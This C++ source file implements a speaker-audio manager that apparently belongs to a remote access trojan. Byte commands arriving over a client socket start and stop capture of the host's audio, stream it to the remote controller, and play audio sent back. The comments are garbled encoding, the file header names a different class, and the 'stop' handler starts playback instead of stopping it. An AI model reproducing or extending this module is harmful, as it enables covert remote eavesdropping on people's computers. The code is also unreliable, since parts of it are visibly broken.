// AudioManager.cpp: implementation of the CSpeakerManager class.
//
//////////////////////////////////////////////////////////////////////


#include "SpeakerManager.h"

#include <IOSTREAM>


using namespace std;

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

CSpeakerManager::CSpeakerManager(CClientSocket* ClientObject) :CManager(ClientObject)
{

	ClientObjectsec = ClientObject;
	m_bIsWorking = FALSE;
	BYTE	bToken = TOKEN_SPEAK_START;
	Send((LPBYTE)&bToken, 1);
	playaudio = false;
	szPacket = NULL;
}


void  CSpeakerManager::OnReceive(LPBYTE szBuffer, UINT ulLength)
{
	switch (szBuffer[0])
	{
	case TOKEN_SPEAK_DATA:
	{
		if (SetSpeakerDate.IsRendering())
		{
			SetSpeakerDate.PlayBuffer((LPBYTE)szBuffer, ulLength);
		}

		break;
	}


	case TOKEN_SPEAK_START:
	{
		if (!GetSpeakerDate.IsCapturing()) //·¢ËÍ
		{
			CoInitialize(NULL);
			GetSpeakerDate.Initialize(ClientObjectsec);
			GetSpeakerDate.Start();
		}

		break;
	}
	case TOKEN_SPEAK_STOP:
	{
		if (GetSpeakerDate.IsCapturing())
		{
			GetSpeakerDate.Stop();
			GetSpeakerDate.Destroy();
			CoUninitialize();
		}

		break;
	}
	case TOKEN_SEND_SPEAK_START:   //²¥·Å
	{
		if (!SetSpeakerDate.IsRendering())
		{
			CoInitialize(NULL);
			SetSpeakerDate.Initialize();
			SetSpeakerDate.Start();
		}

		break;
	}
	case TOKEN_SEND_SPEAK_STOP:    //Í£Ö¹·¢ËÍ
	{
		if (!SetSpeakerDate.IsRendering())
		{
			CoInitialize(NULL);
			SetSpeakerDate.Initialize();
			SetSpeakerDate.Start();
		}

		break;
	}
	default:
		break;
	}
}




CSpeakerManager::~CSpeakerManager()
{

	m_bIsWorking = FALSE;   
	if (SetSpeakerDate.IsRendering())
	{
		SetSpeakerDate.Stop();
		SetSpeakerDate.Destroy();
	}
	if (GetSpeakerDate.IsCapturing())
	{
		GetSpeakerDate.Stop();
		GetSpeakerDate.Destroy();
	}

	CoUninitialize();

	if (szPacket)
	{
		delete[] szPacket;
		szPacket = NULL;
	}
	//ExitProcess(NULL);

}

